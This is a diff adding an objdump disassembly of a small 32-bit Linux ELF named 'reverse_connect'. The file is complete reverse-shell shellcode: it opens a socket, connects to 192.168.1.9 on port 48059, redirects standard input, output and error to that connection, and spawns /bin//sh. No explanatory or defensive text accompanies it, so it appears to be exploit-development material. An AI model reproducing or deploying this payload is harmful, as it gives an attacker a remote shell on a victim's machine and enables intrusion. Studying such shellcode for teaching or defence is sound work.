@@ -1,0 +1,55 @@
+
+reverse_connect:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	31 c0                	xor    %eax,%eax
+ 8048062:	31 db                	xor    %ebx,%ebx
+ 8048064:	31 d2                	xor    %edx,%edx
+ 8048066:	50                   	push   %eax
+ 8048067:	6a 01                	push   $0x1
+ 8048069:	6a 02                	push   $0x2
+ 804806b:	89 e1                	mov    %esp,%ecx
+ 804806d:	fe c3                	inc    %bl
+ 804806f:	b0 66                	mov    $0x66,%al
+ 8048071:	cd 80                	int    $0x80
+ 8048073:	89 c6                	mov    %eax,%esi
+ 8048075:	c6 04 24 c0          	movb   $0xc0,(%esp)
+ 8048079:	c6 44 24 01 a8       	movb   $0xa8,0x1(%esp)
+ 804807e:	c6 44 24 02 01       	movb   $0x1,0x2(%esp)
+ 8048083:	c6 44 24 03 09       	movb   $0x9,0x3(%esp)
+ 8048088:	66 68 bb bb          	pushw  $0xbbbb
+ 804808c:	31 c9                	xor    %ecx,%ecx
+ 804808e:	b1 02                	mov    $0x2,%cl
+ 8048090:	66 51                	push   %cx
+ 8048092:	89 e1                	mov    %esp,%ecx
+ 8048094:	6a 10                	push   $0x10
+ 8048096:	51                   	push   %ecx
+ 8048097:	56                   	push   %esi
+ 8048098:	89 e1                	mov    %esp,%ecx
+ 804809a:	b3 03                	mov    $0x3,%bl
+ 804809c:	b0 66                	mov    $0x66,%al
+ 804809e:	cd 80                	int    $0x80
+ 80480a0:	89 f3                	mov    %esi,%ebx
+ 80480a2:	31 c9                	xor    %ecx,%ecx
+ 80480a4:	b0 3f                	mov    $0x3f,%al
+ 80480a6:	cd 80                	int    $0x80
+ 80480a8:	41                   	inc    %ecx
+ 80480a9:	b0 3f                	mov    $0x3f,%al
+ 80480ab:	cd 80                	int    $0x80
+ 80480ad:	41                   	inc    %ecx
+ 80480ae:	b0 3f                	mov    $0x3f,%al
+ 80480b0:	cd 80                	int    $0x80
+ 80480b2:	31 c0                	xor    %eax,%eax
+ 80480b4:	50                   	push   %eax
+ 80480b5:	68 2f 2f 73 68       	push   $0x68732f2f
+ 80480ba:	68 2f 62 69 6e       	push   $0x6e69622f
+ 80480bf:	89 e3                	mov    %esp,%ebx
+ 80480c1:	50                   	push   %eax
+ 80480c2:	53                   	push   %ebx
+ 80480c3:	89 e1                	mov    %esp,%ecx
+ 80480c5:	31 d2                	xor    %edx,%edx
+ 80480c7:	b0 0b                	mov    $0xb,%al
+ 80480c9:	cd 80                	int    $0x80
